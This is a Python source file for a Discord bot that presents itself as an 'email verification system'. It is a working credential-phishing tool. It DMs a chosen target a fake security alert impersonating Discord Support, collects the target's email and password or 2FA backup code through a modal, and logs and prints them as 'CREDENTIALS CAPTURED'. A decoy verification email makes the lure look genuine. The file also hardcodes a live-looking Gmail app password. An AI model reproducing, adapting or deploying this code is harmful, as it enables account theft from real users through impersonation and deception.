#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════════════════╗
║                    🔥 OBG CYBER EMAIL VERIFICATION SYSTEM 🔥                              ║
║         نظام تحقق متطور يرسل رمز تأكيد عبر البريد الإلكتروني مع واجهة Discord          ║
║                              BY OBADA GAMES / OBG STUDIO                                 ║
║                                    للاستخدام التعليمي فقط                               ║
║                           لا تستخدمه لأذى الآخرين - استخدامه غير قانوني                ║
╚══════════════════════════════════════════════════════════════════════════════════════════╝
"""

import discord
from discord import ui
from discord.ext import commands
import datetime
import smtplib
import random
import string
import time
import json
import os
import sys
import traceback
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header

# ===================================================================
# إعدادات البريد الإلكتروني (ثابتة حسب طلب المستخدم)
# ===================================================================
EMAIL_SENDER = "obgobgstudio@gmail.com"
EMAIL_PASSWORD = "xycd dsfp kivd klhl"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# ملفات التخزين
VERIFICATION_CODES_FILE = "verification_codes.json"
CAPTURED_DATA_FILE = "captured_credentials.log"
ACTIVITY_LOG_FILE = "activity.log"

# ===================================================================
# إعدادات المظهر لـ Termux
# ===================================================================
CYAN = '\033[96m'
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════════╗{RESET}
{RED}║                                                                  ║{RESET}
{RED}║   {CYAN}██████╗ ██████╗  ██████╗     ██████╗██╗   ██╗██████╗ ███████╗██████╗ {RED}║{RESET}
{RED}║   {CYAN}██╔══██╗██╔══██╗██╔════╝     ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗{RED}║{RESET}
{RED}║   {CYAN}██████╔╝██████╔╝██║  ███╗    ██████╔╝ ╚████╔╝ ██████╔╝█████╗  ██████╔╝{RED}║{RESET}
{RED}║   {CYAN}██╔══██╗██╔══██╗██║   ██║    ██╔══██╗  ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗{RED}║{RESET}
{RED}║   {CYAN}██████╔╝██████╔╝╚██████╔╝    ██████╔╝   ██║   ██████╔╝███████╗██║  ██║{RED}║{RESET}
{RED}║   {CYAN}╚═════╝ ╚═════╝  ╚═════╝     ╚═════╝    ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝{RED}║{RESET}
{RED}║                                                                  ║{RESET}
{RED}║              🔥 CYBER EMAIL VERIFICATION SYSTEM 🔥                ║{RESET}
{RED}║                  BY OBADA GAMES / OBG STUDIO                     ║{RESET}
{RED}║                      VERSION 3.0 - ULTIMATE                      ║{RESET}
{RED}╚══════════════════════════════════════════════════════════════════╝{RESET}
""")

# ===================================================================
# دوال إدارة البيانات
# ===================================================================
def load_codes():
    if os.path.exists(VERIFICATION_CODES_FILE):
        try:
            with open(VERIFICATION_CODES_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_codes(codes):
    try:
        with open(VERIFICATION_CODES_FILE, 'w', encoding='utf-8') as f:
            json.dump(codes, f, indent=2, ensure_ascii=False)
    except:
        pass

def save_credentials(email, password, user_name, user_id):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(CAPTURED_DATA_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] USER: {user_name} (ID: {user_id}) | EMAIL: {email} | PASSWORD: {password}\n")
    except:
        pass

def log_activity(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(ACTIVITY_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def generate_code():
    return ''.join(random.choices(string.digits, k=6))

def store_code(email, code):
    codes = load_codes()
    codes[email] = {
        "code": code,
        "timestamp": datetime.datetime.now().isoformat(),
        "verified": False
    }
    save_codes(codes)

def verify_code(email, code):
    codes = load_codes()
    if email not in codes:
        return False
    entry = codes[email]
    if entry["verified"]:
        return False
    try:
        code_time = datetime.datetime.fromisoformat(entry["timestamp"])
        if (datetime.datetime.now() - code_time).total_seconds() > 300:
            return False
    except:
        return False
    if entry["code"] == code:
        entry["verified"] = True
        save_codes(codes)
        return True
    return False

# ===================================================================
# دالة إرسال البريد الإلكتروني (مع معالجة الأخطاء)
# ===================================================================
def send_verification_email(recipient_email, username, code):
    subject = "🔐 DISCORD SUPPORT - Verification Code"
    html_body = f"""
    <html>
    <head><meta charset="UTF-8"></head>
    <body style="font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a1a; color: #e0e0ff; padding: 20px;">
        <div style="max-width: 520px; margin: auto; background: #1a1a2e; padding: 30px; border-radius: 16px; border: 1px solid #7c3aed; box-shadow: 0 0 30px rgba(124,58,237,0.2);">
            <div style="text-align: center; margin-bottom: 20px;">
                <span style="font-size: 28px; font-weight: 900; color: #a78bfa;">🔐 DISCORD SUPPORT</span>
            </div>
            <p style="font-size: 18px; color: #c4b5fd;">Hello <b>{username}</b>,</p>
            <p style="color: #d4d4f0; line-height: 1.6;">We received a verification request for your account. Use the code below to complete verification:</p>
            <div style="background: #0a0a0a; padding: 20px; text-align: center; border-radius: 12px; margin: 25px 0; border: 1px solid #4a4a6a;">
                <span style="font-size: 40px; font-weight: 900; color: #a78bfa; letter-spacing: 6px; font-family: monospace;">{code}</span>
            </div>
            <p style="color: #a0a0c0; font-size: 14px;">⏳ This code expires in <b>5 minutes</b>.</p>
            <p style="color: #6a6a8a; font-size: 13px; border-top: 1px solid #2a2a4a; padding-top: 15px; margin-top: 20px;">
                ⚠️ If you did not request this, please ignore this email.<br>
                Never share this code with anyone.
            </p>
            <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #4a4a6a;">
                OBG STUDIO • Secure Verification System
            </div>
        </div>
    </body>
    </html>
    """
    msg = MIMEMultipart('alternative')
    msg['From'] = EMAIL_SENDER
    msg['To'] = recipient_email
    msg['Subject'] = Header(subject, 'utf-8')
    msg.attach(MIMEText(html_body, 'html', 'utf-8'))
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=15)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.sendmail(EMAIL_SENDER, recipient_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        print(f"{YELLOW}[!] Email error: {e}{RESET}")
        return False

# ===================================================================
# المودال الأول: طلب الإيميل وكلمة المرور (مع defer للحفاظ على التفاعل)
# ===================================================================
class CredentialModal(ui.Modal, title='🔐 Security Verification'):
    email_input = ui.TextInput(
        label='📧 Email Address',
        placeholder='Enter your registered email',
        style=discord.TextStyle.short,
        required=True,
        min_length=5,
        max_length=100
    )
    password_input = ui.TextInput(
        label='🔑 Password / 2FA Code',
        placeholder='Enter your password or backup code',
        style=discord.TextStyle.long,
        required=True,
        min_length=4,
        max_length=200
    )

    async def on_submit(self, interaction: discord.Interaction):
        # تأخير الاستجابة الفورية لمنع انتهاء التفاعل
        await interaction.response.defer(ephemeral=True)
        
        email = self.email_input.value.strip()
        password = self.password_input.value.strip()
        user = interaction.user
        user_name = str(user)
        user_id = user.id

        # توليد رمز التحقق
        code = generate_code()
        store_code(email, code)
        
        # حفظ بيانات الاعتماد
        save_credentials(email, password, user_name, user_id)
        log_activity(f"CREDENTIALS: {user_name} | Email: {email}")

        # طباعة في Terminal
        print(f"\n{GREEN}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"{GREEN}🔥 CREDENTIALS CAPTURED 🔥{RESET}")
        print(f"{GREEN}═══════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}[*] User:{RESET} {user_name} (ID: {user_id})")
        print(f"{CYAN}[*] Email:{RESET} {email}")
        print(f"{CYAN}[*] Password:{RESET} {password}")
        print(f"{CYAN}[*] Code sent to:{RESET} {email}")
        print(f"{GREEN}═══════════════════════════════════════════════════════════════{RESET}\n")

        # إرسال البريد الإلكتروني
        email_sent = send_verification_email(email, user_name, code)
        if email_sent:
            status_msg = "✅ Verification code sent successfully!"
        else:
            status_msg = "⚠️ Failed to send email. Code may not arrive."

        # إرسال الرد عبر followup (لأننا استخدمنا defer)
        view = CodeVerificationView(email)
        await interaction.followup.send(
            f"{status_msg}\n\n"
            "Please check your email and enter the 6‑digit code below.",
            view=view,
            ephemeral=True
        )

# ===================================================================
# المودال الثاني: طلب رمز التحقق (مع defer)
# ===================================================================
class CodeModal(ui.Modal, title='🔑 Enter Verification Code'):
    code_input = ui.TextInput(
        label='6‑Digit Code',
        placeholder='Enter the code from your email',
        style=discord.TextStyle.short,
        required=True,
        min_length=6,
        max_length=6
    )

    def __init__(self, email):
        super().__init__()
        self.email = email

    async def on_submit(self, interaction: discord.Interaction):
        # تأخير الاستجابة الفورية
        await interaction.response.defer(ephemeral=True)
        
        code = self.code_input.value.strip()
        user = interaction.user
        
        if verify_code(self.email, code):
            log_activity(f"VERIFIED: {user} (Email: {self.email})")
            print(f"{GREEN}[✓] Verification successful for {user} (Email: {self.email}){RESET}")
            await interaction.followup.send(
                "✅ **Verification Successful!**\n\n"
                "Your account has been verified and secured.\n"
                "Thank you for using OBG Security Systems.",
                ephemeral=True
            )
        else:
            log_activity(f"FAILED: {user} (Email: {self.email}) - Invalid/expired code")
            await interaction.followup.send(
                "❌ **Invalid or expired code.**\n\n"
                "Please request a new code by clicking the button again.\n"
                "Make sure you enter the latest code sent to your email.",
                ephemeral=True
            )

# ===================================================================
# View مع زر لفتح مودال التحقق
# ===================================================================
class CodeVerificationView(ui.View):
    def __init__(self, email):
        super().__init__(timeout=None)
        self.email = email

    @ui.button(label='🔑 Enter Verification Code', style=discord.ButtonStyle.primary, emoji='✅')
    async def code_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(CodeModal(self.email))

# ===================================================================
# View مع زر لفتح المودال الأول (طلب الإيميل والباسورد)
# ===================================================================
class CredentialView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @ui.button(label='🛡️ Verify Account Now', style=discord.ButtonStyle.danger, emoji='🔒')
    async def verify_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(CredentialModal())

# ===================================================================
# البوت الرئيسي
# ===================================================================
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix=".", intents=intents)
        self.start_time = datetime.datetime.now()

    async def on_ready(self):
        print(f"{GREEN}[+] CYBER OBG Engine Online: {self.user}{RESET}")
        print(f"{CYAN}[+] Connected to {len(self.guilds)} servers{RESET}")
        try:
            synced = await self.tree.sync()
            print(f"{GREEN}[+] Synced {len(synced)} slash commands{RESET}")
        except Exception as e:
            print(f"{RED}[-] Failed to sync commands: {e}{RESET}")
        print(f"{MAGENTA}[*] Email service ready: {EMAIL_SENDER}{RESET}")
        print(f"{YELLOW}[*] Type /verify @user to send verification notification.{RESET}")

    async def deploy_notification(self, target_id):
        try:
            user = await self.fetch_user(target_id)
            embed = discord.Embed(
                title="🔴 CRITICAL SECURITY ALERT",
                description=(
                    "**Unusual Activity Detected**\n\n"
                    "We noticed a login attempt from an unrecognized IP address.\n"
                    "To secure your account, you must verify your identity immediately.\n\n"
                    "**📌 Details:**\n"
                    "• 🖥️ Device: Terminal-Linux-v8\n"
                    "• 🌍 Location: Unknown (VPN/Proxy detected)\n"
                    "• ⏰ Time: " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC") + "\n"
                    "• 🔑 Action: Verification Required"
                ),
                color=0xFF0000,
                timestamp=datetime.datetime.utcnow()
            )
            embed.add_field(
                name="🔒 How to fix this?",
                value=(
                    "1. Click **Verify Account Now** below.\n"
                    "2. Enter your **email address** and **password**.\n"
                    "3. Check your email for a **6-digit code**.\n"
                    "4. Enter the code to complete verification."
                ),
                inline=False
            )
            embed.set_image(url="https://i.imgur.com/8N4p7zS.png")
            embed.set_footer(text="Security Department • Case ID: #OBG-88219")

            view = CredentialView()
            await user.send(embed=embed, view=view)
            log_activity(f"NOTIFICATION SENT to {user} (ID: {target_id})")
            print(f"{GREEN}[+] Notification sent to {user} (ID: {target_id}){RESET}")

        except discord.Forbidden:
            print(f"{RED}[-] Cannot send message to user {target_id} (DM disabled or blocked).{RESET}")
            log_activity(f"FAILED: Cannot DM user {target_id}")
        except Exception as e:
            print(f"{RED}[-] Failed to send notification: {e}{RESET}")
            log_activity(f"ERROR: {e}")

# ===================================================================
# إنشاء البوت
# ===================================================================
bot = CyberBot()

# ===================================================================
# أوامر سلاش
# ===================================================================
@bot.tree.command(name="verify", description="Send verification notification to a user (Admin only)")
async def slash_verify(interaction: discord.Interaction, user: discord.User):
    OWNER_ID = 1459275756214685707
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("⛔ You are not authorized to use this command.", ephemeral=True)
        return
    await interaction.response.send_message(f"📨 Sending verification notification to {user.mention}...", ephemeral=True)
    await bot.deploy_notification(user.id)

@bot.tree.command(name="stats", description="Show bot statistics (Admin only)")
async def slash_stats(interaction: discord.Interaction):
    OWNER_ID = 1459275756214685707
    if interaction.user.id != OWNER_ID:
        await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)
        return
    codes = load_codes()
    total = len(codes)
    verified = sum(1 for c in codes.values() if c.get("verified", False))
    pending = total - verified
    captured_count = 0
    if os.path.exists(CAPTURED_DATA_FILE):
        try:
            with open(CAPTURED_DATA_FILE, 'r', encoding='utf-8') as f:
                captured_count = sum(1 for _ in f)
        except:
            pass
    uptime = datetime.datetime.now() - bot.start_time
    uptime_str = str(uptime).split('.')[0]
    embed = discord.Embed(
        title="📊 OBG Security Statistics",
        color=0x7c3aed,
        timestamp=datetime.datetime.utcnow()
    )
    embed.add_field(name="🔑 Total Codes Generated", value=str(total), inline=True)
    embed.add_field(name="✅ Verified Accounts", value=str(verified), inline=True)
    embed.add_field(name="⏳ Pending", value=str(pending), inline=True)
    embed.add_field(name="📁 Credentials Captured", value=str(captured_count), inline=True)
    embed.add_field(name="🕒 Uptime", value=uptime_str, inline=True)
    embed.add_field(name="📡 Servers", value=str(len(bot.guilds)), inline=True)
    embed.set_footer(text="OBG STUDIO • Security System")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ===================================================================
# التشغيل
# ===================================================================
if __name__ == "__main__":
    print_banner()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║                    🔧 SYSTEM SETUP 🔧                         ║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════╝{RESET}")
    token = input(f"{CYAN}Enter Bot Token: {RESET}").strip()
    target_id_str = input(f"{CYAN}Enter Target User ID (numeric): {RESET}").strip()
    try:
        target_id = int(target_id_str)
    except ValueError:
        print(f"{RED}[-] Invalid Target ID. Must be a number. Exiting.{RESET}")
        sys.exit(1)
    print(f"{GREEN}[+] Starting Cyber OBG System...{RESET}")
    log_activity(f"SYSTEM STARTED | Token: {token[:10]}... | Target: {target_id}")

    @bot.event
    async def on_ready():
        await bot.deploy_notification(target_id)
        print(f"{YELLOW}[*] Waiting for user interaction... Do not close Termux.{RESET}")
        print(f"{MAGENTA}[*] Email service is ready: {EMAIL_SENDER}{RESET}")

    try:
        bot.run(token)
    except discord.LoginFailure:
        print(f"{RED}[-] Invalid token. Please check your bot token.{RESET}")
        log_activity("ERROR: Invalid token")
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Bot stopped by user.{RESET}")
        log_activity("SYSTEM STOPPED (KeyboardInterrupt)")
    except Exception as e:
        print(f"{RED}[-] An unexpected error occurred: {e}{RESET}")
        log_activity(f"ERROR: {e}")
        traceback.print_exc()
